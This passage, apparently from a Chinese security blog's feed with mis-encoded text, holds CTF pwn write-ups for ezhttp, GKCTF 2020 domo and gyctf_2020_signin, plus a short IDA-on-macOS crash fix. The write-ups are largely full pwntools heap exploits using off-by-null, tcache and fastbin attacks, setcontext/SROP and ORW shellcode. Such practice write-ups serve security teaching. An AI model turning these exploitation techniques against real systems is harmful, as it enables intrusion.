,å‰©ä¸‹çš„å°±å¥½è¯´äº†ï¼Œå…¨å¼„æˆ<code>a</code>çš„åƒåœ¾å­—ç¬¦å †ã€‚</p><p>ç„¶åå†æ¬¡editï¼Œè¿™ä¸ª<code>_IO_2_1_stdout_</code>å³å¯æ³„æ¼å‡ºlibcåœ°å€ã€‚</p><h4 id="æ”¹free-hookå†™setcontextæ—¶çš„ç»†èŠ‚"><a href="#æ”¹free-hookå†™setcontextæ—¶çš„ç»†èŠ‚" class="headerlink" title="æ”¹free hookå†™setcontextæ—¶çš„ç»†èŠ‚"></a>æ”¹free hookå†™setcontextæ—¶çš„ç»†èŠ‚</h4><p>å…¶ä¸­éœ€è¦æ³¨æ„ä¸€ä¸‹libcç‰ˆæœ¬ï¼Œåœ¨æœ€ä½çš„libc 2.27ç‰ˆæœ¬ä¸­ï¼Œå…¶ç»å¸¸æ˜¯ä»¥<code>0xXXXXXXX00a0</code>è¿™æ ·çš„å­˜åœ¨ã€‚ç›´æ¥æ”¹å†™æ—¶ï¼Œ<code>/x00</code>è¢«æˆªæ–­ï¼Œå†™ä¸ä¸Šfree hookã€‚ç„¶åæƒ³ç€ç”¨edit è¿›è¡Œä¿®æ”¹ã€‚ä½†æ˜¯ä¼šå‘ç°ï¼Œæ­¤æ—¶åçš„free hookæƒ…å†µä¸‹ï¼Œç”¨editç›´æ¥crushã€‚</p><p>è€ƒè™‘å‡çº§ä¸€ä¸‹libcç‰ˆæœ¬å·å¯¹åº”å¯¹èµ›é¢˜æœåŠ¡å™¨çš„libcç‰ˆæœ¬ï¼Œä½†æ˜¯libc2.27æœ€è¿‘æ›´æ–°äº†ï¼Œç›´æ¥<code>apt upgrade libc6</code> å°±ä¼šå‡çº§åˆ°libc 2.27:1.3æœ€æ–°ç‰ˆæœ¬ï¼Œå…¶å¢åŠ äº†å¯¹double freeçš„æ£€æµ‹ï¼Œå°±ç›´æ¥åšä¸äº†äº†ã€‚</p><p>apt æŒ‡å®šç‰ˆæœ¬çš„å‡çº§ï¼š</p><div class="hljs"><pre><code class="hljs undefined">apt-cache madison libc6                  apt-<span class="hljs-builtin-name">get</span> install <span class="hljs-attribute">libc6</span>=2.27-3ubuntu1.2 apt-cache madison libc6-dbgapt-<span class="hljs-builtin-name">get</span> install <span class="hljs-attribute">libc6-dbg</span>=2.27-3ubuntu1.2</code></pre></div><p>è¿™æ ·å°±å‡çº§å¥½äº†ï¼Œå¹¶ä¸”è§£å†³äº†ä¸ªäººå†™setcontextçš„é—®é¢˜ï¼Œå› ä¸ºå…¶åœ°å€æ²¡æœ‰å†æœ‰``x00<div class="hljs"><pre><code class="hljs ã€‚">### exp```python#!/usr/bin/env python# encoding: utf-8from pwn import *import timelocal_file  = &apos;./ezhttp&apos;elf = ELF(local_file)context.log_level = &apos;debug&apos;debug = 1if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&apos;172.17.0.2&apos;,23946)    libc = elf.libc    #libc = ELF(&apos;.&apos;)context.arch = elf.archcontext.terminal = [&apos;tmux&apos;,&apos;neww&apos;]#,&apos;&apos;splitw&apos;,&apos;-h&apos;arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &apos;\0&apos;))uu64    = lambda data               :u64(data.ljust(8, &apos;\0&apos;))info_addr = lambda tag, addr        :io.info(tag + &apos;==&gt;&apos; +&apos;: &#123;:#x&#125;&apos;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&apos;b main&apos;)    gdb.attach(io)    pause()# debug()def add(data):    content = &apos;POST\n&apos;    content += &apos;/create \nCookie: user=admin token: \r\n\r\n&apos;    content += &apos;content=&apos;+str(data)    ru(&apos;Send Http packet to me:&apos;)    s(str(content))    sleep(0.05)def free(index):    content = &apos;POST\n&apos;    content += &apos;/del \nCookie: user=admin token: \r\n\r\n&apos;    content += &apos;index=&apos;+str(index)    ru(&apos;Send Http packet to me:&apos;)    s(str(content))def edit(idx,data):    content = &apos;POST\n&apos;    content += &apos;/edit \nCookie: user=admin token: \r\n\r\n&apos;    content += &apos;index=&apos;+ str(idx) + &apos;&amp;content=&apos;+str(data)+ &apos;\n&apos;    s(str(content))    sleep(0.05)def leak_addr():    payload = &apos;1&apos; *0x100    add(payload)     ru(&apos;0x&apos;)    heap_base = int(r(12),16) - 0x10    info_addr(&apos;heap_base&apos;,heap_base)    add(payload)     add(&apos;1&apos;*0x8)     add(&apos;1&apos;*0xf8)    for i in range(7):        free(0)    free(0)    add(&apos;\x60\xa7&apos;)     add(&apos;1&apos;*0x18)     add(&apos;1&apos;*0x20)     free(6)    free(6)    add(&apos;1&apos;*0x20)     payload = p64(heap_base + 0x10)    edit(7,payload)    add(&apos;1&apos;*0x20)     # debug()    add(&apos;1&apos;*0x20)     sleep(0.1)    payload = p64(0x12345678fbad3c80) + &apos;\x01&apos; *0x20    add(payload) #8    payload = p64(0xfbad3c80) + p64(0) * 3 + &apos;\x00&apos;    edit(10,payload)    add(&apos;1&apos;*0x90)    return heap_baseleak = 0while True:    try:        heap_base = leak_addr()        ss = io.recvuntil(chr(0x7f),timeout = 0.5)        if len(ss) == 0:            raise Exception(&apos;&apos;)        io.recv(16)        leak = u64(io.recv(8))        if leak == 0x320a6464412e310a:            raise Exception(&apos;&apos;)        break    except Exception:        io.close()        io = process(&apos;./ezhttp&apos;)        continueleak = leak &gt;&gt; 16info_addr(&apos;leak&apos;,leak)libc_base = leak - 0x3eb780info_addr(&apos;libc_base&apos;,libc_base)free_hook = 0x3ed8e8 + libc_baseset_context = libc.sym[&apos;setcontext&apos;] + 53 + libc_baseinfo_addr(&apos;heap_base&apos;,heap_base)info_addr(&apos;context&apos;,set_context)orw = shellcraft.open(&apos;./flag&apos;)orw +=shellcraft.read(&apos;rax&apos;,heap_base+0x300,0x30)orw +=shellcraft.write(1,heap_base+0x300,0x30)edit(11,asm(orw))# debug()frame = SigreturnFrame()frame.rdi = 0frame.rsi = free_hookframe.rdx = 0x300frame.rsp = free_hookframe.rip = libc_base + libc.search(asm(&quot;syscall \nret&quot;)).next()edit(1,str(frame))free(2)free(2)free(2)# debug()add(p64(free_hook))add(&apos;1&apos;*6)info_addr(&apos;context&apos;,set_context)add(p64(set_context))# debug()free(1)pop_rdi = 0x000000000002155f+libc_basepop_rsi = 0x0000000000023e8a+libc_basepop_rdx = libc_base+0x0000000000001b96pop_rax = libc_base+0x0000000000043a78payload = flat([pop_rdi,heap_base-0x250,pop_rsi,0x1000,pop_rdx,7,libc_base+libc.sym[&apos;mprotect&apos;],heap_base+0x80])s(payload)itr()</code></pre></div></p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mac ä¸Šida 7.0 é—ªé€€ æ‰“ä¸å¼€ è§£å†³åŠæ³•</title>
    <link href="/2020/10/06/mac%20%E4%B8%8Aida%207.0%20%E9%97%AA%E9%80%80%20%E6%89%93%E4%B8%8D%E5%BC%80%20%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
    <url>/2020/10/06/mac%20%E4%B8%8Aida%207.0%20%E9%97%AA%E9%80%80%20%E6%89%93%E4%B8%8D%E5%BC%80%20%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="mac-ä¸Šida-7-0-é—ªé€€-æ‰“ä¸å¼€-è§£å†³åŠæ³•"><a href="#mac-ä¸Šida-7-0-é—ªé€€-æ‰“ä¸å¼€-è§£å†³åŠæ³•" class="headerlink" title="mac ä¸Šida 7.0 é—ªé€€ æ‰“ä¸å¼€ è§£å†³åŠæ³•"></a>mac ä¸Šida 7.0 é—ªé€€ æ‰“ä¸å¼€ è§£å†³åŠæ³•</h1><h2 id="æƒ…æ™¯1"><a href="#æƒ…æ™¯1" class="headerlink" title="æƒ…æ™¯1"></a>æƒ…æ™¯1</h2><p>ä¸‹è½½ä»¥åç›´æ¥ä¸èƒ½ç”¨çš„ã€‚</p><p><a href="https://github.com/fjh658/IDA7.0_SP" target="_blank" rel="noopener">https://github.com/fjh658/IDA7.0_SP</a></p><p><a href="https://github.com/swfangzhang/IDA-pro-7-for-Catalina-OSX-15" target="_blank" rel="noopener">https://github.com/swfangzhang/IDA-pro-7-for-Catalina-OSX-15</a></p><p>å‚è€ƒè¿™ä¸ªä¸¤ä¸ªgithubçš„é¡¹ç›®å³å¯ã€‚</p><h2 id="æƒ…æ™¯2"><a href="#æƒ…æ™¯2" class="headerlink" title="æƒ…æ™¯2"></a>æƒ…æ™¯2</h2><p>å¹³æ—¶æ­£å¸¸ä½¿ç”¨ï¼Œçªç„¶å› ä¸ºè£…äº†å†²çªçš„æ’ä»¶æ‰“ä¸å¼€idaï¼Œç›´æ¥crashã€‚æˆ–è€…è«åç‚¹å‡»idaå›¾æ ‡å°±æ²¡æœ‰ä»»ä½•ååº”ã€‚è¿›å…¥ida.app bin ä¸‹çš„idaï¼ŒåŒå‡»æ‰§è¡Œå‘½ä»¤è¡Œä¸­ï¼Œä¼šæ˜¾ç¤ºå†…æ ¸é”™è¯¯çš„æƒ…å†µã€‚</p><div class="hljs"><pre><code class="hljs python">~ cd .idapro ~/.idapro  rm -rf ida.reg</code></pre></div><p>è¿™æ ·å°±å¯ä»¥è§£å†³äº†ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>æ‚é¡¹</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF åˆ·é¢˜è®°å½•</title>
    <link href="/2020/09/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/09/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="BUUCTFåˆ·é¢˜è®°å½•"><a href="#BUUCTFåˆ·é¢˜è®°å½•" class="headerlink" title="BUUCTFåˆ·é¢˜è®°å½•"></a>BUUCTFåˆ·é¢˜è®°å½•</h1><h2 id="GKCTF-2020-demo"><a href="#GKCTF-2020-demo" class="headerlink" title="GKCTF 2020 demo"></a>GKCTF 2020 demo</h2><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>å¼€å¯äº†æ²™ç®±ï¼Œä¸è¿‡åœ¨mainå‡½æ•°çš„æœ€åï¼Œåœ¨whileå¾ªç¯é‡ŒåšåŠ¨ä½œå°±ä¸ä¼šè§¦å‘åˆ°ã€‚<br>å…¶ä¸­addå’Œfree å‡½æ•°ï¼Œä¸Šæ¥éƒ½ä¼šæ£€æµ‹<code>free_hook malloc_hook</code> æ˜¯å¦ä¸ä¸º0ï¼Œä¸ä¸º0å°±ä¸è®©è¿›è¡Œç›¸åº”çš„æ“ä½œã€‚</p><h4 id="æ¼æ´ç‚¹"><a href="#æ¼æ´ç‚¹" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( (nbytes &amp; <span class="hljs-number">0x80000000</span>) == <span class="hljs-number">0L</span>L &amp;&amp; nbytes &lt;= <span class="hljs-number">0x120</span> )       &#123;         heaplist[SHIDWORD(nbytes)] = <span class="hljs-built_in">malloc</span>(nbytes);         <span class="hljs-built_in">puts</span>(<span class="hljs-string">"content:"</span>);         read(<span class="hljs-number">0</span>, heaplist[SHIDWORD(nbytes)], nbytes);         *(heaplist[SHIDWORD(nbytes)] + nbytes) = <span class="hljs-number">0</span>;<span class="hljs-comment">// off by null</span>         ++counts;       &#125;</code></pre></div><p>Addä¸­å­˜åœ¨<code>OFF BY NULL</code>ã€‚</p><h3 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ul><li>åˆ©ç”¨off by null æ„é€ ä¸€ä¸ªå †é‡å </li><li>æ³„æ¼å‡ºlibcåœ°å€</li><li>2æ¬¡é‡Šæ”¾é‡å çš„chunkï¼Œè¿›è¡Œfastbin attack <code>malloc_hook_</code>ä¸º one gadget</li><li>é€šè¿‡è¯»å…¥choiceçš„scanfå‡½æ•°ï¼Œä¼ é€å¤§é‡å­—èŠ‚ï¼Œå…¶ä¼šè°ƒç”¨mallocç”³è¯·chunkï¼Œå³å¯get shell</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./domo'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27019</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-string">''' line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009 0005: 0x15 0x03 0x00 0x0000000a  if (A == mprotect) goto 0009 0006: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0009 0007: 0x15 0x01 0x00 0xffffd8b6  if (A == 0xffffd8b6) goto 0009 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0009: 0x06 0x00 0x00 0x00000000  return KILL'''</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))    sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))add(<span class="hljs-number">0x80</span>,<span class="hljs-string">'1'</span>) add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>) add(<span class="hljs-number">0xf0</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">0x10</span>,<span class="hljs-string">'1'</span>) free(<span class="hljs-number">1</span>)free(<span class="hljs-number">0</span>)data = <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0x100</span>)add(<span class="hljs-number">0x68</span>,data)free(<span class="hljs-number">2</span>)add(<span class="hljs-number">0x80</span>,<span class="hljs-string">'\x00'</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'\x00'</span>)add(<span class="hljs-number">0xf0</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">0x18</span>,<span class="hljs-string">'1'</span>)free(<span class="hljs-number">2</span>)free(<span class="hljs-number">5</span>)free(<span class="hljs-number">0</span>)show(<span class="hljs-number">4</span>)r()libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4b31</span>info_addr(<span class="hljs-string">'libc_base '</span>,libc_base)malloc_hook=libc_base+libc.symbols[<span class="hljs-string">'__malloc_hook'</span>]realloc_hook=libc_base+libc.symbols[<span class="hljs-string">'realloc'</span>]add(<span class="hljs-number">0x68</span>,p64(malloc_hook<span class="hljs-number">-0x23</span>))add(<span class="hljs-number">0x68</span>,p64(malloc_hook<span class="hljs-number">-0x23</span>))add(<span class="hljs-number">0x68</span>,p64(malloc_hook<span class="hljs-number">-0x23</span>))onegadget = <span class="hljs-number">0x4526a</span> + libc_basedata = <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0xb</span>+p64(onegadget)+ p64(realloc_hook+realloc[<span class="hljs-number">0</span>])add(<span class="hljs-number">0x68</span>,data)sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">500</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div><h3 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h3><ul><li>è¿˜å¯ä»¥æ”»å‡»<code>calloc_hook</code>,å› ä¸ºseccompé‡Œé¢è°ƒç”¨äº†callocã€‚</li><li>æ”»å‡»io file è¿›è¡Œæ³„æ¼å’Œorwã€‚ï¼ˆå…ˆç­‰å¾…å¤ç°ï¼‰<br><a href="https://github.com/Starssgo/pwn_challange/blob/master/domo/exp.py" target="_blank" rel="noopener">https://github.com/Starssgo/pwn_challange/blob/master/domo/exp.py</a></li></ul><h2 id="gyctf-2020-signin"><a href="#gyctf-2020-signin" class="headerlink" title="gyctf_2020_signin"></a><code>gyctf_2020_signin</code></h2><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ul><li>uafï¼Œä½†æ˜¯å­˜åœ¨ä¸€ä¸ªflagä½ç”¨äºæ£€æµ‹æ˜¯å¦freeè¿‡</li><li>editåªèƒ½ä¸€æ¬¡</li><li>å­˜åœ¨åé—¨å‡½æ•°ï¼Œå…¶ä¸­è¿˜ä¼šç”¨callocç”³è¯·ä¸€ä¸ªchunk,å¹¶ä¸”åªéœ€è¦<code>0x004040C0</code>å¤„æœ‰æ•°å€¼å³å¯è§¦å‘ã€‚</li></ul><h3 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3><h4 id="calloc-çš„ç‰¹æ€§ï¼š"><a href="#calloc-çš„ç‰¹æ€§ï¼š" class="headerlink" title="calloc çš„ç‰¹æ€§ï¼š"></a>calloc çš„ç‰¹æ€§ï¼š</h4><ul><li>åœ¨ç”³è¯·åˆ°çš„chunkä¸Šä¼šè¿›è¡Œä¸€ä¸ªç½®é›¶çš„æ“ä½œ</li><li>ä¸ä¼šä»tcache bin ä¸­å–chunk <h4 id="tcache-çš„-int-mallocæœ‰ä»¥ä¸‹ç‰¹æ€§ï¼š"><a href="#tcache-çš„-int-mallocæœ‰ä»¥ä¸‹ç‰¹æ€§ï¼š" class="headerlink" title="tcache çš„_int_mallocæœ‰ä»¥ä¸‹ç‰¹æ€§ï¼š"></a>tcache çš„<code>_int_malloc</code>æœ‰ä»¥ä¸‹ç‰¹æ€§ï¼š</h4></li></ul><p>åœ¨åˆ†é… fastbin ä¸­çš„ chunk æ—¶ï¼Œè‹¥æ­¤chainä¸Šè¿˜æœ‰å…¶ä»–chunk ï¼Œåˆ™è°ƒç”¨<code>tcache_put</code>æŠŠå®ƒä»¬å…¨éƒ¨æ”¾å…¥ tcache ä¸­(smallbinsä¸­ä¹Ÿæ˜¯å¦‚æ­¤)ã€‚</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-comment">/* While we're here, if we see other chunks of the same size, stash them in the tcache.  */</span>  <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (nb);  <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)&#123;  mchunkptr tc_victim;  <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span>  <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count     &amp;&amp; (pp = *fb) != <span class="hljs-literal">NULL</span>)    &#123;      REMOVE_FB (fb, tc_victim, pp);      <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)    &#123;      tcache_put (tc_victim, tc_idx);&#125;    &#125;&#125;</code></pre></div><h3 id="æ”»å‡»æ€è·¯-1"><a href="#æ”»å‡»æ€è·¯-1" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ul><li>ç”³è¯·8ä¸ªå †ï¼Œ é‡Šæ”¾8ä¸ªå †ï¼Œæœ€åä¸€ä¸ªä¼šè¿›å…¥fastbin</li><li>edit idx=8 çš„chunkï¼Œæ”¹å…¶fdä¸º<code>0x004040C0 - 0x10</code></li><li>ç”³è¯·ä¸€ä¸ªchunkï¼Œæ­¤æ—¶ä¼šåœ¨tcache chainä¸­æ‹¿èµ°ä¸€ä¸ªï¼Œç•™å‡ºä¸€ä¸ªç©ºä½</li><li>è°ƒç”¨åé—¨å‡½æ•°ï¼Œå…¶ä¸­callocä¼šä»fastbinä¸­æ‹¿å‡ºidx=8çš„chunkï¼Œä½†æ˜¯ç”±äºå…¶ç‰¹æ€§ï¼Œä¼šæŠŠå‰©ä¸‹çš„fdä¸Šåœ°å€ä¹Ÿå½“ä½œä¸€ä¸ªchunkä¸¢è¿›tcache</li><li>ä¸¢è¿›æ—¶æ˜¯ä¸¢åœ¨tcacheçš„å¤´éƒ¨ï¼Œæ‰€ä»¥ä¼šè·Ÿtcache è¿›è¡Œä¸€ä¸ªlinkã€‚ä¹Ÿå°±æ˜¯ä¼šåœ¨è¿™ä¸ªfdåœ°å€ä¸Šå†™ä¸‹ï¼Œtcache chain ä¸Šå…¶ç´§æŒ¨ç€çš„chunkåœ°å€ã€‚è¿™å°±é€ æˆä¸€ä¸ªä»»æ„åœ°å€å†™ã€‚</li></ul><p>æ¼æ´äº§ç”ŸåŸå› ä¹Ÿæ˜¯ï¼Œlibcæºç ä¸­<code>tcache_put</code>åŸºæœ¬æ²¡æœ‰å®‰å…¨æ£€æŸ¥ã€‚</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./gyctf_2020_signin'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27592</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'your choice?'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'your choice?'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    s(str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'your choice?'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):    add(i)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):    free(i)edit(<span class="hljs-number">7</span>,p64(<span class="hljs-number">0x4040C0</span><span class="hljs-number">-0x10</span>))add(<span class="hljs-number">8</span>)sla(<span class="hljs-string">'your choice?'</span>,<span class="hljs-string">'6'</span>)debug()itr()</code></pre></div><h3 id="é¢˜è®°"><a href="#é¢˜è®°" class="headerlink" title="é¢˜è®°"></a>é¢˜è®°</h3><p>åœ¨åšçš„æ—¶å€™ï¼Œå¼€å§‹æœ‰ä¸ªæƒ³æ³•ï¼Œmallocç”³è¯·å †æ—¶ï¼Œä¼šåœ¨å…¶è¿”å›åœ°å€çš„ä¸Šæ–¹ç•™ä¸‹sizeä¿¡æ¯ï¼Œä»¥æ­¤æ¥åˆ©ç”¨ã€‚ä½†æ˜¯åœ¨éªŒè¯åï¼Œå‘ç°æ˜¯ä¸ä¼šçš„ã€‚</p><h2 id="gyctf-2020-document"><a href="#gyctf-2020-document" class="headerlink" title="gyctf_2020_document"></a><code>gyctf_2020_document</code></h2><h3 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ul><li>å­˜åœ¨uafæ¼æ´</li><li>åªèƒ½ç”³è¯·ä¸€ä¸ª0x20ã€0x90çš„å †å—ï¼Œä¸èƒ½è¿›è¡Œfastbinè¿›è¡Œæ”»å‡»ã€‚</li></ul><h4 id="personæ•°æ®ç»“æ„"><a href="#personæ•°æ®ç»“æ„" class="headerlink" title="personæ•°æ®ç»“æ„"></a>personæ•°æ®ç»“æ„</h4><div class="hljs"><pre><code class="hljs undefined">                                                                                                   <span class="angelscript">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”              â”‚                      â”‚<span class="hljs-number">0x21</span>â”‚              â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”¤              â”‚             â”‚             â”‚              â”‚   